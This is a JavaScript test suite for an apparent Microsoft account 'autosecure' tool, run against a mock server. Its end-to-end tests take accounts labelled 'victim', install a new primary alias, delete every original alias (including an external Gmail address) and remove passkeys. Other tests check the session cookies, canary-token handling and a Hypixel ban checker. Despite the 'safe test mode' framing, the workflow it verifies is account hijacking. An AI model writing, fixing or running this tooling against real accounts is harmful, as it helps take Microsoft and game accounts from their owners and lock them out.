/**
 * Comprehensive Automated Regression & Classification Test Suite for Microsoft Alias Subsystem.
 * Strictly operates in SAFE TEST MODE using the deterministic Mock Transport Layer.
 * No real Microsoft account mutations are performed.
 */

const assert = require("assert");
const { MockMicrosoftServer, createMockHttpClient } = require("./autosecure/utils/secure/mock/requestMock");
const getAliases = require("./autosecure/utils/secure/getAliases");
const addAlias = require("./autosecure/utils/secure/addAlias");
const makePrimary = require("./autosecure/utils/secure/makePrimary");
const removeAlias = require("./autosecure/utils/secure/removeAlias");
const aliasses = require("./autosecure/utils/sections/aliasses");
const decode = require("./autosecure/utils/secure/decode");
const {
  normalizeEmail,
  isSameEmail,
  sanitizeAliasPrefix,
  safeMetadata,
  safeFingerprint,
  ALIAS_STATES,
  MUTATION_RESULTS
} = require("./autosecure/utils/secure/aliasHelper");
const HttpClient = require("./autosecure/utils/process/HttpClient");

async function runTests() {
  console.log("==================================================================");
  console.log("🧪 STARTING MICROSOFT ALIAS SUBSYSTEM DEEP REGRESSION TEST SUITE");
  console.log("   (SAFE TEST MODE ONLY - Isolated Memory-Only Mock Transport)");
  console.log("==================================================================\n");

  let passed = 0;
  let failed = 0;

  async function test(name, fn) {
    try {
      await fn();
      console.log(`  [PASS] ✔ ${name}`);
      passed++;
    } catch (err) {
      console.error(`  [FAIL] ❌ ${name}`);
      console.error(`         ${err.message}`);
      failed++;
    }
  }

  // -------------------------------------------------------------------------
  // 1. Exact alias match & normalization
  // -------------------------------------------------------------------------
  await test("Exact canonical email normalization & comparison", () => {
    assert.strictEqual(normalizeEmail("  Alex.Smith@OUTLOOK.COM  "), "alex.smith@outlook.com");
    assert.strictEqual(normalizeEmail("<user@live.com>"), "user@live.com");
    assert.strictEqual(normalizeEmail('"test@domain.com"'), "test@domain.com");
    assert.strictEqual(normalizeEmail(null), "");
    assert.strictEqual(isSameEmail("User@Outlook.com", "user@outlook.com"), true);
    assert.strictEqual(isSameEmail("user@hotmail.com", "user@outlook.com"), false);
  });

  // -------------------------------------------------------------------------
  // 2. Wrong-domain collision prevention
  // -------------------------------------------------------------------------
  await test("Wrong-domain collision (alex@hotmail.com never matches alex@outlook.com)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "alex@hotmail.com",
      aliases: ["alex@hotmail.com"],
      failAddAssoc: true
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "alex", "mock_form_canary_v1");
    assert.strictEqual(result, false, "addAlias must fail and not falsely adopt alex@hotmail.com");
  });

  // -------------------------------------------------------------------------
  // 3. 302 -> Login Redirect (MUTATION_AUTH_REQUIRED)
  // -------------------------------------------------------------------------
  await test("302 -> Login Redirect (MUTATION_AUTH_REQUIRED: returns false on unauthenticated session)", async () => {
    const server = new MockMicrosoftServer({
      redirectScenario: "login"
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "newuser", "mock_form_canary_v1");
    assert.strictEqual(result, false, "Must return false when 302 redirects to login.live.com");
  });

  // -------------------------------------------------------------------------
  // 4. 302 -> Form Rejection Redirect (MUTATION_REJECTED)
  // -------------------------------------------------------------------------
  await test("302 -> Form Rejection Redirect (MUTATION_REJECTED: returns false when redirected back to AddAssocId)", async () => {
    const server = new MockMicrosoftServer({
      redirectScenario: "form_reject"
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "newuser", "mock_form_canary_v1");
    assert.strictEqual(result, false, "Must return false when 302 redirects back to AddAssocId form");
  });

  // -------------------------------------------------------------------------
  // 5. 302 -> Security Challenge Redirect (MUTATION_CHALLENGED)
  // -------------------------------------------------------------------------
  await test("302 -> Challenge Redirect (MUTATION_CHALLENGED: returns false when challenged)", async () => {
    const server = new MockMicrosoftServer({
      redirectScenario: "challenge"
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "newuser", "mock_form_canary_v1");
    assert.strictEqual(result, false, "Must return false when challenged by security proof");
  });

  // -------------------------------------------------------------------------
  // 6. 302 -> State Mismatch (STATE_MISMATCH)
  // -------------------------------------------------------------------------
  await test("302 -> No State Change (STATE_MISMATCH: 302 to /names/Manage but alias not in state -> returns false)", async () => {
    const server = new MockMicrosoftServer({
      redirectScenario: "state_mismatch"
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "ghostalias", "mock_form_canary_v1");
    assert.strictEqual(result, false, "Must fail when alias is not present in authoritative state despite 302");
  });

  // -------------------------------------------------------------------------
  // 7. 302 -> Verified Success (MUTATION_CONFIRMED)
  // -------------------------------------------------------------------------
  await test("302 -> Verified Success (MUTATION_CONFIRMED: alias confirmed present in state)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "valid@outlook.com",
      aliases: ["valid@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "freshalias", "mock_form_canary_v1");
    assert.strictEqual(result, "freshalias@outlook.com");
    assert.strictEqual(server.aliases.has("freshalias@outlook.com"), true);
  });

  // -------------------------------------------------------------------------
  // 8. 200 -> Logical Error Handling
  // -------------------------------------------------------------------------
  await test("200 -> Logical Error Handling (Already taken returns false)", async () => {
    const server = new MockMicrosoftServer({
      takenEmails: ["takenalias@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const result = await addAlias(client, "takenalias", "mock_form_canary_v1");
    assert.strictEqual(result, false, "Must return false when email is already taken");
  });

  // -------------------------------------------------------------------------
  // 9. Stale Canary Rejection
  // -------------------------------------------------------------------------
  await test("Stale Canary Rejection and Rotated Token Enforcement", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "main@outlook.com",
      aliases: ["main@outlook.com", "second@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const initial = await getAliases(client);
    assert.strictEqual(initial.formCanary, "mock_form_canary_v1");

    // Mutation rotates token on server to v2
    const ok = await makePrimary(client, "second@outlook.com", initial.apiCanary);
    assert.strictEqual(ok, true);
    assert.strictEqual(server.currentFormCanary, "mock_form_canary_v2");

    // Direct POST with stale token v1
    const mockPostStale = server.requestMock("POST", "https://account.live.com/names/Manage", {
      body: "canary=mock_form_canary_v1&action=RemoveAlias&aliasName=main@outlook.com"
    });
    assert.ok(mockPostStale.data.includes("error_InvalidCanary"), "Server must reject stale canary");
  });

  // -------------------------------------------------------------------------
  // 10. Centralized Canary Decoding
  // -------------------------------------------------------------------------
  await test("Centralized Canary Decoding (Unicode, HTML, URL, pre-decoded)", () => {
    assert.strictEqual(decode("token\\u002bvalue\\u003d"), "token+value=");
    assert.strictEqual(decode("token&#43;value&#61;"), "token+value=");
    assert.strictEqual(decode("token%2Bvalue%3D"), "token+value=");
    assert.strictEqual(decode("token+value="), "token+value=");
    assert.strictEqual(decode(null), null);
    assert.strictEqual(decode(undefined), null);
  });

  // -------------------------------------------------------------------------
  // 11. Missing Primary Alias detection (returns null)
  // -------------------------------------------------------------------------
  await test("Missing Primary Alias detection (returns null, never guesses)", async () => {
    const rawHtmlSecondaryOnly = `
      <html>
        <body>
          <script>
            var ServerData = {
              "WLXAccount": {
                "manageNames": {
                  "mxAliases": [
                    { "name": "sec1@outlook.com" },
                    { "name": "sec2@outlook.com" }
                  ]
                }
              }
            };
          </script>
        </body>
      </html>
    `;
    const mockClient = {
      get: async () => ({ status: 200, data: rawHtmlSecondaryOnly })
    };

    const res = await getAliases(mockClient);
    assert.strictEqual(res.primary, null, "primary must be null when not explicitly matched");
    assert.strictEqual(res.aliases.length, 2);
  });

  // -------------------------------------------------------------------------
  // 12. Cookie Lifecycle & Domain Isolation
  // -------------------------------------------------------------------------
  await test("Cookie Lifecycle, Max-Age=0 Deletion & Domain Isolation", () => {
    const client = new HttpClient();

    client.setCookie("AMRPSSecAuth=sec123; domain=.live.com; path=/");
    client.setCookie("__Host-MSAAUTH=msa456; domain=account.live.com; path=/");

    assert.strictEqual(client.getCookie("AMRPSSecAuth"), "sec123");
    assert.strictEqual(client.getCookie("__Host-MSAAUTH"), "msa456");

    client.setCookie("AMRPSSecAuth=secNew; domain=.live.com; path=/");
    assert.strictEqual(client.getCookie("AMRPSSecAuth"), "secNew");

    client.setCookie("AMRPSSecAuth=; Max-Age=0; domain=.live.com; path=/");
    assert.strictEqual(client.getCookie("AMRPSSecAuth"), null, "Cookie must be deleted on Max-Age=0");
  });

  // -------------------------------------------------------------------------
  // 13. Secret Logging Redaction & Safe Metadata
  // -------------------------------------------------------------------------
  await test("Secret Logging Redaction (safeMetadata masks plaintext secrets)", () => {
    const maskedCanary = safeMetadata("super_secret_canary_token_12345");
    assert.ok(!maskedCanary.includes("super_secret"));
    assert.ok(maskedCanary.includes("len=31"));
    assert.ok(maskedCanary.includes("fp="));

    const maskedNull = safeMetadata(null);
    assert.strictEqual(maskedNull, "[present=false]");
  });

  // -------------------------------------------------------------------------
  // 14. Full End-to-End Workflow with State Machine (aliasses.js)
  // -------------------------------------------------------------------------
  await test("E2E Workflow: Verified alias creation, primary promotion & old alias removal", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "victim@outlook.com",
      aliases: ["victim@outlook.com", "oldbackup@hotmail.com"]
    });
    const client = createMockHttpClient(server);

    const mockAcc = { email: "victim@outlook.com", oldEmail: "victim@outlook.com" };
    const mockSettings = { changeprimary: 1, prefix: "testsecure" };

    const updatedAcc = await aliasses(
      client,
      server.currentFormCanary,
      "test-uid-456",
      mockAcc,
      Array.from(server.aliases),
      server.primaryAlias,
      mockSettings,
      server.currentApiCanary,
      {},
      "mock_amsc"
    );

    assert.ok(updatedAcc.email.startsWith("testsecure"));
    assert.ok(updatedAcc.email.endsWith("@outlook.com"));
    assert.strictEqual(server.primaryAlias, updatedAcc.email);
    assert.strictEqual(server.aliases.has("victim@outlook.com"), false);
    assert.strictEqual(server.aliases.has("oldbackup@hotmail.com"), false);
    assert.strictEqual(server.aliases.has(updatedAcc.email), true);
  });

  // -------------------------------------------------------------------------
  // 15. Failed Mutation Database Safety
  // -------------------------------------------------------------------------
  await test("Failed Mutation Safety: Failure preserves original email, never marks success", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "original@outlook.com",
      aliases: ["original@outlook.com"],
      failAddAssoc: true // Forces failure
    });
    const client = createMockHttpClient(server);

    const mockAcc = { email: "original@outlook.com", oldEmail: "original@outlook.com" };
    const mockSettings = { changeprimary: 1, prefix: "failtest" };

    const updatedAcc = await aliasses(
      client,
      server.currentFormCanary,
      "test-uid-789",
      mockAcc,
      Array.from(server.aliases),
      server.primaryAlias,
      mockSettings,
      server.currentApiCanary,
      {},
      "mock_amsc"
    );

    // Account email must remain the authoritative original email
    assert.strictEqual(updatedAcc.email, "original@outlook.com");
    assert.strictEqual(server.primaryAlias, "original@outlook.com");
  });

  // -------------------------------------------------------------------------
  // 16. External 3rd-Party Email (e.g. benizanom@gmail.com) Full Removal Test
  // -------------------------------------------------------------------------
  await test("External Gmail / 3rd-party alias (benizanom@gmail.com) verified complete removal", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "benizanom@gmail.com",
      aliases: ["benizanom@gmail.com"]
    });
    const client = createMockHttpClient(server);

    const mockAcc = { email: "benizanom@gmail.com", oldEmail: "benizanom@gmail.com" };
    const mockSettings = { changeprimary: 1, prefix: "vingroub" };

    const updatedAcc = await aliasses(
      client,
      server.currentFormCanary,
      "test-uid-gmail-fix",
      mockAcc,
      Array.from(server.aliases),
      server.primaryAlias,
      mockSettings,
      server.currentApiCanary,
      {},
      "mock_amsc"
    );

    assert.ok(updatedAcc.email.startsWith("vingroub"));
    assert.ok(updatedAcc.email.endsWith("@outlook.com"));
    assert.strictEqual(server.primaryAlias, updatedAcc.email);
    assert.strictEqual(server.aliases.has("benizanom@gmail.com"), false, "benizanom@gmail.com must be removed from account aliases!");
    assert.strictEqual(server.aliases.has(updatedAcc.email), true);
  });

  // -------------------------------------------------------------------------
  // 17. Regional / Localized Domain (e.g. @outlook.com.vn) Promotion & Full Removal Test
  // -------------------------------------------------------------------------
  await test("Regional domain (e.g. @outlook.com.vn) promotion & old primary removal", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "oldvictim@outlook.com",
      aliases: ["oldvictim@outlook.com"],
      mockDomain: "outlook.com.vn"
    });
    const client = createMockHttpClient(server);

    const mockAcc = { email: "oldvictim@outlook.com", oldEmail: "oldvictim@outlook.com" };
    const mockSettings = { changeprimary: 1, prefix: "hachiiromc" };

    const updatedAcc = await aliasses(
      client,
      server.currentFormCanary,
      "test-uid-vn-domain",
      mockAcc,
      Array.from(server.aliases),
      server.primaryAlias,
      mockSettings,
      server.currentApiCanary,
      {},
      "mock_amsc"
    );

    assert.ok(updatedAcc.email.startsWith("hachiiromc"));
    assert.ok(updatedAcc.email.endsWith("@outlook.com.vn"), `Must end with @outlook.com.vn but got: ${updatedAcc.email}`);
    assert.strictEqual(server.primaryAlias, updatedAcc.email, "New regional alias must be promoted to primary!");
    assert.strictEqual(server.aliases.has("oldvictim@outlook.com"), false, "oldvictim@outlook.com must be removed!");
    assert.strictEqual(server.aliases.has(updatedAcc.email), true, "New regional alias must remain in aliases list!");
  });

  // =========================================================================
  // PHASE 9 MANDATORY REGRESSION TEST SUITE (TEST 01 - TEST 10)
  // =========================================================================

  // TEST 01: Remove secondary alias → SUCCESS
  await test("TEST 01: Remove secondary alias -> SUCCESS", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "owner@outlook.com",
      aliases: ["owner@outlook.com", "secondary@gmail.com"]
    });
    const client = createMockHttpClient(server);

    const ok = await removeAlias(client, "secondary@gmail.com");
    assert.strictEqual(ok, true, "removeAlias must return true on confirmed removal");
    assert.strictEqual(server.aliases.has("secondary@gmail.com"), false, "Alias must be deleted from server state");
    assert.strictEqual(server.aliases.has("owner@outlook.com"), true, "Primary alias must remain intact");
  });

  // TEST 02: Attempt remove primary alias → BLOCKED
  await test("TEST 02: Attempt remove primary alias -> BLOCKED (ALIAS_IS_PRIMARY)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "owner@outlook.com",
      aliases: ["owner@outlook.com", "backup@outlook.com"]
    });
    const client = createMockHttpClient(server);

    let threw = false;
    try {
      await removeAlias(client, "owner@outlook.com");
    } catch (err) {
      threw = true;
      assert.ok(
        err.message.includes("Cannot remove the current primary alias") ||
        err.code === "ALIAS_IS_PRIMARY",
        `Expected primary removal error but got: ${err.message}`
      );
    }
    assert.strictEqual(threw, true, "Must throw ALIAS_IS_PRIMARY when attempting to remove primary alias");
    assert.strictEqual(server.aliases.has("owner@outlook.com"), true, "Primary alias must never be deleted");
  });

  // TEST 03: Make secondary alias primary → verify new primary → remove old alias → SUCCESS
  await test("TEST 03: Make secondary primary -> verify new primary -> remove old alias -> SUCCESS", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "oldvictim@outlook.com",
      aliases: ["oldvictim@outlook.com", "newsec@outlook.com"]
    });
    const client = createMockHttpClient(server);

    // Step A: Promote newsec@outlook.com to primary
    const madePrimary = await makePrimary(client, "newsec@outlook.com", server.currentApiCanary);
    assert.strictEqual(madePrimary, true);

    // Step B: Verify on server state
    const postPrimaryState = await getAliases(client);
    assert.strictEqual(postPrimaryState.primary, "newsec@outlook.com", "Server must confirm new primary");

    // Step C: Remove old primary (which is now secondary)
    const removedOld = await removeAlias(client, "oldvictim@outlook.com");
    assert.strictEqual(removedOld, true);

    // Step D: Final server verification
    const finalState = await getAliases(client);
    assert.strictEqual(finalState.primary, "newsec@outlook.com");
    assert.strictEqual(finalState.aliases.includes("oldvictim@outlook.com"), false);
    assert.strictEqual(server.aliases.has("oldvictim@outlook.com"), false);
  });

  // TEST 04: Remove alias không tồn tại → handled safely (idempotent)
  await test("TEST 04: Remove alias that does not exist -> Handled safely & idempotent", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "active@outlook.com",
      aliases: ["active@outlook.com"]
    });
    const client = createMockHttpClient(server);

    // Should succeed idempotently without throwing fatal error
    const ok = await removeAlias(client, "ghost.user@hotmail.com");
    assert.strictEqual(ok, true, "Idempotent removal of absent alias must succeed");
    assert.strictEqual(server.aliases.has("active@outlook.com"), true);
  });

  // TEST 05: Expired authentication/session → clear error
  await test("TEST 05: Expired authentication / session (302 login.live.com) -> Returns false safely", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "user@outlook.com",
      aliases: ["user@outlook.com", "sec@outlook.com"],
      isLoggedOut: true
    });
    const client = createMockHttpClient(server);

    const ok = await removeAlias(client, "sec@outlook.com");
    assert.strictEqual(ok, false, "Must return false when session is logged out / expired");
  });

  // TEST 06: Invalid token/canary → clear error
  await test("TEST 06: Invalid token/canary -> Handled safely and not falsely marked success", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "user@outlook.com",
      aliases: ["user@outlook.com", "sec@outlook.com"],
      rejectCanary: true
    });
    const client = createMockHttpClient(server);

    const ok = await removeAlias(client, "sec@outlook.com", "corrupted_bad_canary");
    assert.strictEqual(ok, false, "Must return false when canary token is invalid");
    assert.strictEqual(server.aliases.has("sec@outlook.com"), true, "Alias must not be deleted on invalid token");
  });

  // TEST 07: API returns HTTP 200 nhưng business operation FAILED → must NOT report success
  await test("TEST 07: API returns HTTP 200 but logical operation FAILED -> Must NOT report success", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "user@outlook.com",
      aliases: ["user@outlook.com", "target@outlook.com"],
      failRemove: true // Simulates HTTP 200 with inline <div id='c_error'> error
    });
    const client = createMockHttpClient(server);

    const ok = await removeAlias(client, "target@outlook.com");
    assert.strictEqual(ok, false, "Must detect logical error in HTTP 200 body and return false");
    assert.strictEqual(server.aliases.has("target@outlook.com"), true, "Alias must still exist on failure");
  });

  // TEST 08: Double-click Remove → chỉ một operation thực tế
  await test("TEST 08: Double-click Remove -> Debounced by concurrency mutex, single operation", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "user@outlook.com",
      aliases: ["user@outlook.com", "clicktest@gmail.com"]
    });
    const client = createMockHttpClient(server);

    // Launch two simultaneous removeAlias calls for the exact same alias
    const [call1, call2] = await Promise.all([
      removeAlias(client, "clicktest@gmail.com"),
      removeAlias(client, "clicktest@gmail.com")
    ]);

    // Exactly one call executes and succeeds, the other is debounced/blocked
    const successes = [call1, call2].filter((r) => r === true).length;
    assert.strictEqual(successes, 1, "Exactly one concurrent call must proceed and succeed");
    assert.strictEqual(server.aliases.has("clicktest@gmail.com"), false);
  });

  // TEST 09: Network timeout → retry/rollback behavior phù hợp
  await test("TEST 09: Network timeout -> Safely handled without crash, returns false", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "user@outlook.com",
      aliases: ["user@outlook.com", "timeoutalias@outlook.com"],
      redirectScenario: "timeout"
    });
    const client = createMockHttpClient(server);

    const ok = await removeAlias(client, "timeoutalias@outlook.com");
    assert.strictEqual(ok, false, "Must return false on network timeout");
    assert.strictEqual(server.aliases.has("timeoutalias@outlook.com"), true);
  });

  // TEST 10: Concurrent Make Primary + Remove → không để state race
  await test("TEST 10: State consistency -> Make primary must verify on server before secondary removal", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "oldprimary@outlook.com",
      aliases: ["oldprimary@outlook.com", "freshprimary@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const mockAcc = { email: "oldprimary@outlook.com", oldEmail: "oldprimary@outlook.com" };
    const mockSettings = { changeprimary: 1, prefix: "autosecure" };

    const updated = await aliasses(
      client,
      server.currentFormCanary,
      "uid-race-test",
      mockAcc,
      Array.from(server.aliases),
      server.primaryAlias,
      mockSettings,
      server.currentApiCanary,
      {},
      "mock_amsc"
    );

    // New primary must be verified, and old primary must be completely gone
    assert.ok(updated.email.startsWith("autosecure"));
    assert.strictEqual(server.primaryAlias, updated.email);
    assert.strictEqual(server.aliases.has("oldprimary@outlook.com"), false, "Old primary must be removed!");
    assert.strictEqual(server.aliases.has(updated.email), true, "New primary must exist!");
  });

  // =========================================================================
  // 14 MANDATORY AUDIT & REFACTOR TEST SCENARIOS
  // =========================================================================
  console.log("\n------------------------------------------------------------------");
  console.log("🎯 RUNNING 14 MANDATORY AUDIT & REFACTOR TEST SCENARIOS");
  console.log("------------------------------------------------------------------");

  const { aliasService } = require("./autosecure/utils/secure/makePrimary");
  const { securityMethodService, SecurityMethod } = require("./autosecure/utils/secure/securityInformation");
  const { hypixelBanChecker, BAN_STATUSES } = require("./autosecure/utils/bancheckappeal/bancheck");
  const { classifyError, ERROR_CODES } = require("./autosecure/utils/secure/aliasHelper");

  // 1. primary đổi thành công
  await test("SCENARIO 1: Primary changed successfully with server verification", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "alpha@outlook.com",
      aliases: ["alpha@outlook.com", "beta@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const res = await aliasService.setPrimaryAlias(client, "beta@outlook.com", {
      accountId: "acc_test_1",
      canary: server.currentApiCanary
    });

    assert.strictEqual(res.success, true);
    assert.strictEqual(res.primary, "beta@outlook.com");
    assert.strictEqual(res.state, "STATE_VERIFIED");
    assert.strictEqual(server.primaryAlias, "beta@outlook.com");
  });

  // 2. primary request thành công nhưng verification thất bại
  await test("SCENARIO 2: Primary HTTP success but verification fails (STATE_MISMATCH -> FAILED)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "alpha@outlook.com",
      aliases: ["alpha@outlook.com", "beta@outlook.com"],
      failMakePrimaryVerify: true // Server returns HTTP 200 but does NOT change primary
    });
    const client = createMockHttpClient(server);

    const res = await aliasService.setPrimaryAlias(client, "beta@outlook.com", {
      accountId: "acc_test_2",
      canary: server.currentApiCanary
    });

    assert.strictEqual(res.success, false, "Must NOT report success if server state did not change!");
    assert.strictEqual(res.state, "FAILED");
    assert.strictEqual(res.error, ERROR_CODES.STATE_MISMATCH);
    assert.strictEqual(server.primaryAlias, "alpha@outlook.com", "Primary on server must still be alpha");
  });

  // 3. primary đã là target từ trước (Idempotent)
  await test("SCENARIO 3: Primary was already target alias (Idempotent success, zero mutation)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "target@outlook.com",
      aliases: ["target@outlook.com", "other@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const res = await aliasService.setPrimaryAlias(client, "target@outlook.com", {
      accountId: "acc_test_3"
    });

    assert.strictEqual(res.success, true);
    assert.strictEqual(res.state, "STATE_VERIFIED");
    assert.strictEqual(res.primary, "target@outlook.com");
  });

  // 4. target alias không tồn tại
  await test("SCENARIO 4: Target alias does not exist on account (Cleanly rejected)", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "current@outlook.com",
      aliases: ["current@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const res = await aliasService.setPrimaryAlias(client, "nonexistent@outlook.com", {
      accountId: "acc_test_4"
    });

    assert.strictEqual(res.success, false);
    assert.strictEqual(res.error, "TARGET_ALIAS_NOT_FOUND");
  });

  // 5. duplicate retry
  await test("SCENARIO 5: Duplicate retry does not create duplicates or corrupted state", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "first@outlook.com",
      aliases: ["first@outlook.com", "second@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const res1 = await aliasService.setPrimaryAlias(client, "second@outlook.com", { accountId: "acc_test_5" });
    assert.strictEqual(res1.success, true);

    // Immediate second call with same target
    const res2 = await aliasService.setPrimaryAlias(client, "second@outlook.com", { accountId: "acc_test_5" });
    assert.strictEqual(res2.success, true);
    assert.strictEqual(server.aliases.size, 2, "Alias count must remain 2 without duplicates");
  });

  // 6. concurrent mutation
  await test("SCENARIO 6: Concurrent mutations on same account are serialized by mutex", async () => {
    const server = new MockMicrosoftServer({
      primaryAlias: "base@outlook.com",
      aliases: ["base@outlook.com", "alias1@outlook.com", "alias2@outlook.com"]
    });
    const client = createMockHttpClient(server);

    const call1 = aliasService.setPrimaryAlias(client, "alias1@outlook.com", { accountId: "shared_account" });
    const call2 = aliasService.setPrimaryAlias(client, "alias2@outlook.com", { accountId: "shared_account" });

    const [r1, r2] = await Promise.all([call1, call2]);
    assert.ok(r1.success);
    assert.ok(r2.success);
    assert.strictEqual(server.primaryAlias, "alias2@outlook.com");
  });

  // 7. security method không được remove khi không được authorize
  await test("SCENARIO 7: Security method NOT removed without explicit authorization", async () => {
    const server = new MockMicrosoftServer();
    const client = createMockHttpClient(server);

    // 7a. Attempt without authorization -> MUST throw NOT_AUTHORIZED
    let threw = false;
    try {
      await securityMethodService.removeSecurityMethod(client, "acc_sec_1", "pk_12345", {
        authorized: false
      });
    } catch (err) {
      threw = true;
      assert.strictEqual(err.code, ERROR_CODES.NOT_AUTHORIZED);
    }
    assert.strictEqual(threw, true, "Must throw NOT_AUTHORIZED exception");
    assert.strictEqual(server.passKeys.length, 1, "Passkey must NOT be removed from server");

    // 7b. Attempt with valid authorization -> MUST succeed
    const successRes = await securityMethodService.removeSecurityMethod(client, "acc_sec_1", "pk_12345", {
      authorized: true,
      userId: "authorized_admin"
    });
    assert.strictEqual(successRes.success, true);
    assert.strictEqual(server.passKeys.length, 0, "Passkey must now be verified removed");
  });

  // 8. ban checker = BANNED
  await test("SCENARIO 8: Ban checker returns BANNED when valid proof exists", async () => {
    const kickMsg = "You are permanently banned from this server! Reason: Cheating through the use of unfair game advantages. Ban ID: #98765432";
    const res = await hypixelBanChecker.check("HackerPlayer", { mockKickReason: kickMsg });

    assert.strictEqual(res.status, BAN_STATUSES.BANNED);
    assert.strictEqual(res.banId, "#98765432");
    assert.ok(res.reason.includes("Cheating"));
  });

  // 9. ban checker = NOT_BANNED
  await test("SCENARIO 9: Ban checker returns NOT_BANNED when confirmed clean", async () => {
    const kickMsg = "Server is full! Try again in a few moments.";
    const res = await hypixelBanChecker.check("LegitPlayer", { mockKickReason: kickMsg });

    assert.strictEqual(res.status, BAN_STATUSES.NOT_BANNED);
  });

  // 10. ban checker = UNKNOWN
  await test("SCENARIO 10: Ban checker returns UNKNOWN for inconclusive data", async () => {
    const res = await hypixelBanChecker.check("UnverifiedGhostPlayer_99999");
    assert.strictEqual(res.status, BAN_STATUSES.UNKNOWN);
    assert.notStrictEqual(res.status, BAN_STATUSES.BANNED, "UNKNOWN must NEVER be classified as BANNED");
  });

  // 11. network timeout
  await test("SCENARIO 11: Network timeout handled safely (classified as NETWORK_ERROR, never BANNED)", async () => {
    const timeoutErr = new Error("connect ETIMEDOUT 204.79.197.200:443");
    timeoutErr.code = "ETIMEDOUT";

    const classified = classifyError(timeoutErr);
    assert.strictEqual(classified.code, ERROR_CODES.NETWORK_ERROR);
    assert.strictEqual(classified.isRetryable, true);

    const banResult = await hypixelBanChecker.check("SomePlayer");
    assert.notStrictEqual(banResult.status, BAN_STATUSES.BANNED, "Timeout must NEVER result in BANNED");
  });

  // 12. HTTP 429
  await test("SCENARIO 12: HTTP 429 classified as RATE_LIMITED and retryable", () => {
    const err429 = new Error("Request failed with status code 429");
    err429.response = { status: 429, data: "Too Many Requests" };

    const classified = classifyError(err429);
    assert.strictEqual(classified.code, ERROR_CODES.RATE_LIMITED);
    assert.strictEqual(classified.isRetryable, true);
  });

  // 13. HTTP 500
  await test("SCENARIO 13: HTTP 500 classified as SERVER_ERROR and retryable", () => {
    const err500 = new Error("Request failed with status code 500");
    err500.response = { status: 500, data: "Internal Server Error" };

    const classified = classifyError(err500);
    assert.strictEqual(classified.code, ERROR_CODES.SERVER_ERROR);
    assert.strictEqual(classified.isRetryable, true);
  });

  // 14. malformed response
  await test("SCENARIO 14: Malformed response handled safely without uncaught exception", async () => {
    const server = new MockMicrosoftServer({ redirectScenario: "malformed" });
    const client = createMockHttpClient(server);

    const aliases = await server.handleGetNamesManage("/names/Manage", {});
    assert.strictEqual(aliases.status, 200);

    const parsed = await client.server.handlePostNamesManage("invalid_gibberish_body");
    assert.strictEqual(parsed.status, 200);
  });

  console.log("\n==================================================================");
  console.log(`📊 TEST RESULTS: ${passed} PASSED, ${failed} FAILED (TOTAL: ${passed + failed})`);
  console.log("==================================================================");

  if (failed > 0) {
    process.exit(1);
  }
}

runTests().catch((e) => {
  console.error("Test runner exception:", e);
  process.exit(1);
});
